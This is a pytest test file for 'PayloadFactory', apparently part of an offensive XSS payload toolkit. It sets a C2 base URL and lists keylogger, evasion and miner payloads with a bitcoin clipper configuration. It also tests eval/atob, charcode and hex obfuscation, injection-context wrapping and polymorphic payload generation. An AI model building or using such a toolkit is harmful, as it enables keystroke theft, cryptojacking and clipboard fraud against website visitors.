"""
Unit tests for PayloadFactory
"""
import pytest
from exxploit.core.factory import PayloadFactory


class TestPayloadFactory:
    """Test suite for PayloadFactory class."""
    
    @pytest.fixture
    def factory(self):
        """Create a PayloadFactory instance for testing."""
        return PayloadFactory(c2_base="http://test.local:8080")
    
    def test_list_payloads(self, factory):
        """Test that list_payloads returns expected payload names."""
        payloads = factory.list_payloads()
        assert isinstance(payloads, list)
        assert len(payloads) >= 9
        assert 'keylogger' in payloads
        assert 'evasion' in payloads
        assert 'miner' in payloads
    
    def test_load_payload_valid(self, factory):
        """Test loading a valid payload."""
        code = factory.load_payload('keylogger')
        assert isinstance(code, str)
        assert len(code) > 0
        assert 'console.log' not in code or 'addEventListener' in code
    
    def test_load_payload_invalid(self, factory):
        """Test loading an invalid payload returns error message."""
        code = factory.load_payload('nonexistent_payload')
        assert 'Unknown payload' in code
    
    def test_obfuscate_base64(self, factory):
        """Test base64 obfuscation."""
        code = "alert('test')"
        result = factory.obfuscate(code, 'base64')
        assert 'eval' in result
        assert 'atob' in result
    
    def test_obfuscate_charcode(self, factory):
        """Test charcode obfuscation."""
        code = "alert('test')"
        result = factory.obfuscate(code, 'charcode')
        assert 'String.fromCharCode' in result
    
    def test_obfuscate_hex(self, factory):
        """Test hex obfuscation."""
        code = "alert('test')"
        result = factory.obfuscate(code, 'hex')
        assert 'eval' in result
        assert '\\x' in result
    
    def test_obfuscate_split(self, factory):
        """Test split obfuscation."""
        code = "alert('test')"
        result = factory.obfuscate(code, 'split')
        assert 'atob' in result
        assert '+' in result
    
    def test_build_chain(self, factory):
        """Test building a payload chain."""
        chain = factory.build_chain(['evasion', 'keylogger'], obfuscation='base64')
        assert isinstance(chain, str)
        assert len(chain) > 100
    
    def test_detect_context_html(self, factory):
        """Test HTML context detection."""
        html = "<div>Hello</div>"
        context = factory.detect_context(html)
        assert context == 'html'
    
    def test_detect_context_script(self, factory):
        """Test script context detection."""
        html = "<script>var x = 1;</script>"
        context = factory.detect_context(html)
        assert context == 'script'
    
    def test_detect_context_attribute(self, factory):
        """Test attribute context detection."""
        html = '<input value="test'
        context = factory.detect_context(html)
        assert context == 'attribute'
    
    def test_select_payload(self, factory):
        """Test payload selection with context wrapping."""
        result = factory.select_payload('keylogger', context='html', obfuscation='base64')
        assert '<svg' in result or 'onload' in result
    
    def test_generate_polymorphic(self, factory):
        """Test polymorphic payload generation."""
        result1 = factory.generate_polymorphic('keylogger', context='html')
        result2 = factory.generate_polymorphic('keylogger', context='html')
        # Variable names should differ between calls
        assert isinstance(result1, str)
        assert isinstance(result2, str)
    
    def test_variable_injection(self, factory):
        """Test variable injection in payloads."""
        variables = {
            'CLIPPER_CONFIG': {
                'addresses': {'btc': '1TestAddress'},
                'logUrl': None
            }
        }
        code = factory.load_payload('miner', variables=variables)
        # The payload should have config injected
        assert isinstance(code, str)


class TestPayloadFactoryDescriptions:
    """Test payload descriptions."""
    
    def test_all_payloads_have_descriptions(self):
        """Ensure all payloads have descriptions."""
        factory = PayloadFactory()
        for name in factory.list_payloads():
            assert name in factory.DESCRIPTIONS, f"Missing description for {name}"
            assert len(factory.DESCRIPTIONS[name]) > 5
